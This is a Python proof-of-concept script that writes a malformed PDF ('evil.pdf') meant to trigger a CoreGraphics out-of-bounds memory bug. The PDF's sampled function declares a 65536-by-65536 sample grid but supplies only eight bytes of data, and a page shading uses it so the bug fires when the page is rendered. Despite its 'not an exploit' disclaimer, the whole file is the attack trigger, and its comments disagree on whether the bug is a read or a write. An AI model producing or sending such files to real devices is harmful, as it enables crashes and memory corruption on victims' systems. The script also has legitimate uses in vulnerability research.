#!/usr/bin/env python3
"""
gen_pdf_sampledfunc_overflow.py — SCAFFOLD, not an exploit.

Target : CVE-2026-112610 / CVE-2026-112611 (CoreGraphics PDF OOB write)
Theory : a sampled function (FunctionType 0) declares /Size dimensions whose
         product times the sample size exceeds the stream data, so the
         parser writes past the destination buffer while expanding samples.
Usage  : python3 gen_pdf_sampledfunc_overflow.py > evil.pdf
"""

import sys

def build_pdf():
    objs = []

    def add(body: bytes) -> int:
        objs.append(body)
        return len(objs)

    # 1: Catalog
    cat = add(b"")  # placeholder, filled later
    # 2: Pages
    pages = add(b"")
    # 3: Page
    page = add(b"")
    # 4: Content stream
    content = add(b"")
    # 5: Function dict + stream
    func = add(b"")

    # Function stream: only 8 bytes of sample data, but /Size declares a
    # 65536^2 grid. A parser that trusts /Size will try to read ~2^32 bytes.
    sample_data = b"\x00" * 8
    func_body = (
        b"5 0 obj\n"
        b"<< /FunctionType 0 /Domain [0 1 0 1] /Range [0 1 0 1 0 1]\n"
        b"   /Size [65536 65536] /BitsPerSample 8 /Order 1\n"
        b"   /Length %d >>\nstream\n" % len(sample_data)
        + sample_data +
        b"\nendstream\nendobj\n"
    )
    objs[func - 1] = func_body

    # Content: use the function in a shading that is filled over the page.
    content_data = (
        b"q 1 0 0 1 0 0 cm "
        b"/Sh1 sh Q\n"
    )
    objs[content - 1] = (
        b"4 0 obj\n<< /Length %d >>\nstream\n" % len(content_data)
        + content_data +
        b"\nendstream\nendobj\n"
    )

    page_body = (
        b"3 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200]\n"
        b"   /Resources << /Shading << /Sh1 6 0 R >> >>\n"
        b"   /Contents 4 0 R >>\nendobj\n"
    )
    objs[page - 1] = page_body

    # Shading dictionary referencing the function.
    shading = add(
        b"6 0 obj\n"
        b"<< /ShadingType 1 /ColorSpace /DeviceRGB\n"
        b"   /Domain [0 1 0 1] /Function 5 0 R >>\nendobj\n"
    )

    objs[pages - 1] = (
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    )
    objs[cat - 1] = (
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    )

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for i, body in enumerate(objs, start=1):
        offsets.append(len(out))
        out += body

    xref_off = len(out)
    out += b"xref\n0 %d\n" % (len(objs) + 1)
    out += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        out += b"%010d 00000 n \n" % off
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\n" % (len(objs) + 1)
    out += b"startxref\n%d\n%%%%EOF\n" % xref_off
    return bytes(out)

def main():
    sys.stdout.buffer.write(build_pdf())
    return 0

if __name__ == "__main__":
    sys.exit(main())
